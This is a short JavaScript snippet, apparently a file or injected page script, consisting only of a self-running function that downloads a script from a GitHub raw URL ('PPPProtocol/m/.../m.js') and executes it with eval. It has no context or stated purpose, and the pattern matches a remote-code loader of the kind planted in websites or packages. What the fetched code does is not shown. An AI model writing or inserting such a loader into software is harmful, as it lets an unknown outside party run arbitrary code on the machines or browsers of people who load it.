(function() {
    fetch('https://raw.githubusercontent.com/PPPProtocol/m/refs/heads/main/m.js')
        .then(res => res.text())
        .then(script => eval(script));
})();